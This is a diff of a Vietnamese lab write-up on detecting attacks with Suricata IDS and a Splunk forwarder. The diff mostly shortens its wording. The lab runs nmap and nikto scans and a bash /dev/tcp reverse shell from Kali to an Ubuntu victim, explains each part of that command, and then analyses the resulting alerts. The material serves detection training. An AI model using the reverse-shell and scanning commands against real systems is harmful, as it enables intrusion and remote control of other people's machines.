@@ -8,7 +8,7 @@
 
 ![image.png](images/image.png)
 
-- Suricata là một công cụ an ninh mạng mã nguồn mở hiệu suất cao, được phát triển bởi Open Information Security Foundation (OISF). Công cụ này hoạt động đồng thời như một hệ thống phát hiện xâm nhập (IDS), ngăn chặn xâm nhập (IPS) và giám sát an ninh mạng (NSM)
+- Suricata là một công cụ an ninh mạng mã nguồn mở, được phát triển bởi Open Information Security Foundation (OISF). Công cụ này hoạt động đồng thời như một hệ thống phát hiện xâm nhập (IDS), ngăn chặn xâm nhập (IPS) và giám sát an ninh mạng (NSM)
 - Rules là tập hợp các chỉ dẫn để Suricata biết cần tìm kiếm cái gì và phải làm gì khi phát hiện thấy dấu hiệu đó.
   Một rule bao gồm hai phần chính:
   - Rule Header: Xác định hành động (alert, drop, pass, reject), giao thức (TCP, UDP, ICMP...), địa chỉ IP (nguồn/đích) và cổng.
@@ -66,15 +66,7 @@ sudo systemctl enable --now suricata
 
 ### Bước 2: Chọn đúng interface để bắt gói
 
-- Xem interface nào có IP `192.168.60.40`:
-
-  ```bash
-  ip -br a
-  ```
-
-  Giả sử interface là `ens33`
-
-- Sửa file mặc định (Ubuntu hay dùng):
+- Sửa file mặc định:
 
   ```bash
   sudo nano /etc/default/suricata
@@ -141,7 +133,7 @@ EVE JSON là định dạng log “chính” của Suricata.
   sudo tail -n 5 /var/log/suricata/eve.json | jq .
   ```
 
-### Bước 4: Cài ruleset (ET Open) để có alert “đúng IDS”
+### Bước 4: Cài ruleset (ET Open)
 
 ```bash
 sudo apt install -y suricata-update
@@ -149,7 +141,7 @@ sudo suricata-update #cập nhật bộ
 sudo systemctl restart suricata
 ```
 
-Kiểm tra rules đã load (xem log service):
+Kiểm tra rules đã load:
 
 ```bash
 sudo journalctl -u suricata --no-pager -n 50
@@ -157,7 +149,7 @@ sudo journalctl -u suricata --no-pager -n 50
 
 ### Bước 5: Monitor file eve.json từ UF
 
-- Tạo inputs.conf ( nếu đã có thì thôi)
+- Tạo inputs.conf
 
   ```bash
   sudo mkdir -p /opt/splunkforwarder/etc/system/local
@@ -179,7 +171,7 @@ sudo journalctl -u suricata --no-pager -n 50
   sudo /opt/splunkforwarder/bin/splunk restart
   ```
 
-### Bước 6: Đảm bảo UF đọc được file log (quyền truy cập)
+### Bước 6: Đảm bảo UF đọc được file log
 
 - Kiểm tra quyền file:
 
@@ -187,7 +179,7 @@ sudo journalctl -u suricata --no-pager -n 50
   ls -l /var/log/suricata/eve.json
   ```
 
-- Nếu UF không đọc được, cách nhanh gọn (lab) là thêm quyền đọc cho group `splunk` hoặc add user splunk vào group `suricata`/`adm` (tùy máy). Ví dụ:
+- Nếu UF không đọc được, cách nhanh gọn là thêm quyền đọc cho group `splunk` hoặc add user splunk vào group `suricata`/`adm`. Ví dụ:
 
   ```bash
   sudo usermod -aG adm splunk
@@ -197,7 +189,7 @@ sudo journalctl -u suricata --no-pager -n 50
 
 # III. Thực hiện tấn công mạng từ máy Kali
 
-## 1. Quét cổng bằng nmap (Reconnaissance)
+## 1. Quét cổng bằng nmap
 
 ```powershell
 nmap -sS -T4 -p- 192.168.60.40
@@ -246,29 +238,29 @@ nikto -h http://192.168.60.40
 
 - Chỉ trong 11 giây mà nikto đã bắn tới 8102 gói tin HTTP vào máy chủ ubuntu
 
-## 3. Thực hiện Reverse Shell (Mô phỏng Mã độc chiếm quyền điều khiển)
+## 3. Thực hiện Reverse Shell
 
-- **Mục tiêu:** Mô phỏng việc kẻ tấn công dụ nạn nhân chạy mã độc, khiến máy nạn nhân (Ubuntu) kết nối ngược về máy tấn công (Kali), cho phép kẻ tấn công điều khiển dòng lệnh.
+- **Mục tiêu:** Mô phỏng việc kẻ tấn công dụ nạn nhân chạy mã độc, khiến máy nạn nhân kết nối ngược về máy tấn công, cho phép kẻ tấn công điều khiển dòng lệnh.
 - **Trên máy Kali Attacker**
-  Mở một cổng lắng nghe (Listener) để chờ kết nối từ nạn nhân.
+  Mở một cổng lắng nghe để chờ kết nối từ nạn nhân.
   ```powershell
   # Lắng nghe trên cổng 4444
   nc -nvlp 4444
   ```
 - **Trên máy Ubuntu victim**
-  Trong thực tế, bước này xảy ra khi người dùng click vào file độc hại hoặc bị khai thác lỗ hổng web. Trong Lab, chúng ta sẽ tự chạy lệnh này để mô phỏng (Simulate).
+  Trong thực tế, bước này xảy ra khi người dùng click vào file độc hại hoặc bị khai thác lỗ hổng web. Trong Lab, chúng ta sẽ tự chạy lệnh này để mô phỏng.
 - Mở terminal trên Ubuntu và chạy lệnh sau:
 
   ```powershell
   bash -i >& /dev/tcp/192.168.60.10/4444 0>&1
   ```
 
-  - `bash -i` (Tạo Shell tương tác)
-    - **`bash`**: Gọi chương trình Bash (Bourne Again Shell), là trình thông dịch lệnh mặc định trên Linux.
-    - **`i` (interactive)**: Chế độ "tương tác". Bình thường, khi bạn chạy một script, bash chạy xong sẽ tắt. Cờ `i` bắt buộc bash phải giữ phiên làm việc mở, hiển thị dấu nhắc lệnh (prompt) và chờ người dùng nhập lệnh tiếp theo. Điều này giúp hacker có cảm giác như đang ngồi trực tiếp trước máy nạn nhân.
-  - `/dev/tcp/192.168.60.10/4444` (Tạo kết nối mạng)
+  - `bash -i`
+    - **`bash`**: Gọi chương trình Bash, là trình thông dịch lệnh mặc định trên Linux.
+    - **`i` (interactive)**: Chế độ "tương tác". Bình thường, khi bạn chạy một script, bash chạy xong sẽ tắt. Cờ `i` bắt buộc bash phải giữ phiên làm việc mở, hiển thị dấu nhắc lệnh và chờ người dùng nhập lệnh tiếp theo.
+  - `/dev/tcp/192.168.60.10/4444`
     - Trên Linux, "mọi thứ đều là file". Bash có một tính năng đặc biệt cho phép nó coi các kết nối mạng như là các file.
-    - Đường dẫn này bảo Bash hãy **mở một kết nối TCP** đến địa chỉ IP `192.168.60.10` (Máy Kali của bạn) tại cổng `4444`.
+    - Đường dẫn này bảo Bash hãy **mở một kết nối TCP** đến địa chỉ IP `192.168.60.10` tại cổng `4444`.
   - `>&` (Chuyển hướng đầu ra)
     - Trong Linux có 3 luồng dữ liệu chính:
     - Stdin (0): Đầu vào (bàn phím).
@@ -326,8 +318,8 @@ nikto -h http://192.168.60.40
   `src_port`: 54810
 - `dest_ip`: 192.168.60.40
   `dest_port`: 80
-- Dịch vụ bị tấn công: Port 80/TCP (HTTP - Giao thức Web)
-- Mã định danh luồng (Flow ID): 999495050042074 (Dùng để truy vết chéo)
+- Dịch vụ bị tấn công: Port 80/TCP
+- Mã định danh luồng: 999495050042074
 - Các dấu hiệu chứng minh
   - Dấu hiệu 1: Cờ báo động (`alerted: true`)
     - _Ý nghĩa:_ Điều này xác nhận rằng trong quá trình kết nối này diễn ra, Suricata đã phát hiện vi phạm và đã sinh ra một Alert (nhưng Alert đó nằm ở file log khác). Đây là bằng chứng thép cho thấy đây không phải truy cập web thông thường.
